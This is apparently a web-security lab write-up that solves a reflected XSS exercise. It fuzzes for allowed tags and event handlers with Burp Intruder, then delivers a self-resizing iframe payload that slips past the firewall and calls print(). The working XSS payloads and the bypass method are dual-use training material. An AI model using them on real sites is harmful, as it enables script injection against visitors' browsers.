## 14 - Reflected XSS into HTML context with most tags and attributes blocked

This lab contains a reflected XSS vulnerability in the search functionality but uses a web application firewall (WAF) to protect against common XSS vectors.

To solve the lab, perform a cross-site scripting attack that bypasses the WAF and calls the print() function.

## Notes

-

## Resume

1. Capture a search request
2. Identify allowed HTML tags
3. Identify allowed event handlers
4. Craft the final payload
5. Deliver the exploit to the victim

## Solve

A classic XSS payload such as:

```html
<img src=1 onerror=print()>
```

is blocked by the application filter.

This indicates that the application is filtering specific HTML tags and event handlers.

First, send a search request to `Burp Intruder`.

Replace the search value with:

```html
<>
```

Add a payload position between the angle brackets:

```html
<§§>
```

Then use the `Copy tags` payload list from the XSS Cheat Sheet and launch a sniper attack.

Results:

- Most tags return `HTTP 400`
- The `<body>` tag returns `HTTP 200`

This confirms that the `body` tag is allowed.


Next, replace the payload with:

```html
<body%20§§=1>
```

Use the `Copy events` payload list from the XSS Cheat Sheet and launch another sniper attack.

Results:

- Most event handlers return `HTTP 400`
- `onresize` returns `HTTP 200`

This confirms that the `onresize` event is allowed.

The final exploit uses an iframe that dynamically resizes itself to trigger the `onresize` event:

```html
<iframe src="https://0a9300a104038d128079038d000c009e.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>
```

Explanation:

- `%22%3E` closes the current HTML attribute/context.
- `<body onresize=print()>` injects the malicious body tag.
- The iframe `onload` changes its width.
- Resizing the iframe triggers the `onresize` event.
- `print()` executes automatically.

Deliver the exploit to the victim using the exploit server.

Working payload:

```html
<iframe src="https://0a9300a104038d128079038d000c009e.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>
```

This payload works because:

1. The `body` tag is allowed.
2. The `onresize` event is allowed.
3. The iframe resizing automatically triggers the event.

The browser executes:

```javascript
print()
```

without any user interaction.
